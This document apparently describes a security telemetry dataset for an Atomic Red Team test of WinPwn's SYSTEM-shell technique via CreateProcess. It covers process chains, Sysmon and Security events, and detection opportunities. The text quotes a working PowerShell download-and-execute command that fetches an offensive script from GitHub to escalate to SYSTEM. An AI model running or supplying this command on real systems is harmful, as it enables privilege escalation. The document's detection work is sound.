# T1106-2: Native API — WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique

## Technique Context

T1106 (Native API) covers the use of Windows APIs as an execution and privilege escalation primitive. This test uses WinPwn, a PowerShell-based offensive toolkit, specifically its `Get-CreateProcessSystem` technique: it downloads a PowerShell script from GitHub at runtime and invokes it to obtain a SYSTEM-level shell by exploiting the `CreateProcess` API in combination with privilege escalation primitives.

The technique is a living-off-the-land attack in two senses: it uses PowerShell (built-in to Windows), and it downloads and executes code from a public repository at runtime rather than bringing a pre-packaged payload. The download target is `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1`. Running WinPwn techniques from raw GitHub URLs is a known real-world adversary pattern; the URL structure and repository are recognizable in threat intelligence.

The SYSTEM escalation via CreateProcess exploits how certain Windows token operations allow a process running as a privileged user to create new processes under the SYSTEM token.

## What This Dataset Contains

This dataset was collected on ACME-WS06, a Windows 11 Enterprise domain workstation with Microsoft Defender disabled. The full technique executed including the download and compilation phases.

**Process Chain (Security EID 4688 / Sysmon EID 1):**

The ART test framework PowerShell (PID 3476) spawns a child PowerShell (PID 308, tagged `technique_id=T1059.001`) with:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
```

This is `Invoke-Expression` with `DownloadString`—an in-memory download and execute pattern that loads the script without writing it to disk.

Security 4688 captures the full process chain including `csc.exe` (PID 0x1af8 / 6904) spawned by the child PowerShell (PID 0x134 / 308):

```
Process Name: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Creator: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

And `cvtres.exe` (PID 0x7f8 / 2040) spawned by `csc.exe`—the resource compiler that is invoked as part of .NET dynamic compilation. The WinPwn script compiles C# code at runtime to create the CreateProcess-based payload.

A second child PowerShell with command `"powershell.exe" & {}` (PID 0x6a8) appears—this is likely the technique's spawned SYSTEM shell (an empty interactive PowerShell prompt).

**In-Memory Download Pattern:**

The `iex(new-object net.webclient).downloadstring(...)` pattern is present in the child PowerShell command line (Sysmon EID 1). This is one of the most well-known PowerShell download-and-execute patterns: it creates a .NET WebClient object, downloads a string from the URL, and passes it directly to `Invoke-Expression` for execution without writing to disk.

**Compilation Evidence:**

Security 4688 shows `csc.exe` (64-bit, `Framework64`) spawned by the child PowerShell and `cvtres.exe` spawned by `csc.exe`. This is the same runtime compilation pattern seen in T1106-1, confirming that WinPwn's Get-CreateProcessSystem technique compiles a C# assembly in-memory as part of its execution.

**Image Loads (Sysmon EID 7):**

Twenty-five DLL load events for PID 3476 (test framework PowerShell)—more than other tests, reflecting the more complex execution environment.

**Network / File Artifacts (Sysmon EID 3 / EID 11):**

Three Sysmon EID 3 network events and one EID 22 DNS query are recorded. However, the network events in the sample capture svchost.exe Delivery Optimization activity (the `keyValueLKG.dat` file creation by svchost.exe confirms DO service activity). An EID 11 file creation captures `C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\State\keyValueLKG.dat`—Delivery Optimization state, not the WinPwn download.

**Process Access (Sysmon EID 10):**

Five events: PID 3476 accessing `whoami.exe` (PID 3784), child PowerShell (PID 308), and PID 1704. The child-powershell-to-parent-access with `0x1FFFFF` and `UNKNOWN` CallTrace is a characteristic WinPwn/IEX execution artifact.

**PowerShell Script Block Logging (EID 4104/4103):**

102 events: 99 EID 4104, 3 EID 4103. The higher 4103 count compared to other tests reflects the more interactive pipeline execution in WinPwn.

## What This Dataset Does Not Contain

The actual HTTP request to `raw.githubusercontent.com` for the WinPwn script is not captured in the sample network events. The download occurs within the child PowerShell process via `WebClient.DownloadString()`, and no EID 3 for PID 308 (the child PowerShell) is in the sample. The downloaded script content is not recorded in script block logs in this sample (IEX-downloaded scripts may appear in EID 4104 under specific AMSI/logging configurations, but in an undefended environment without AMSI logging enabled, the dynamic content may not be fully captured).

The compiled C# assembly (the CreateProcess payload) does not appear as an EID 11 file creation—it was compiled to a temporary path in memory or a temp directory that is not reflected in the captured samples.

The privileged process created by the SYSTEM shell technique does not appear in the sample's EID 1 events.

## Assessment

This dataset captures the most important observable for WinPwn's Get-System via CreateProcess: the `iex(new-object net.webclient).downloadstring(...)` invocation with the specific GitHub URL in the child PowerShell command line, followed by `csc.exe` and `cvtres.exe` spawning—confirming that the downloaded script dynamically compiled and executed .NET code. The combination of download-and-IEX with runtime compilation is highly distinctive.

Compared to the defended variant (sysmon 62, security 15, powershell 42), the undefended dataset is smaller (sysmon 56, security 6, powershell 102). This is the inverse of the pattern seen in other tests: the defended dataset has more Sysmon events because Defender's response to the WinPwn technique generates additional process spawning (MpCmdRun.exe scans, remediation). The PowerShell event count is higher in the undefended run (102 vs. 42) because the full WinPwn execution completes without interruption.

## Detection Opportunities Present in This Data

**IEX + DownloadString from GitHub (EID 1 / EID 4688):** The command line `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/...')` is a high-confidence indicator on its own. The S3cur3Th1sSh1t GitHub repository is a well-known offensive tooling source. Monitoring for `iex` + `downloadstring` + `githubusercontent.com` in process command lines covers the general pattern.

**Runtime csc.exe spawned by PowerShell (EID 4688):** `csc.exe` spawned directly by `powershell.exe` (as opposed to by a build system) indicates dynamic compilation. The presence of `cvtres.exe` as a csc.exe child further confirms compilation occurred.

**PowerShell spawning another PowerShell (EID 4688):** `powershell.exe` spawning `powershell.exe` as a child—especially with an `& { iex ... }` command line—is an injection/execution pattern that warrants investigation.

**Sysmon rule tag T1059.001:** The child PowerShell is tagged by Sysmon's built-in ruleset as PowerShell abuse.
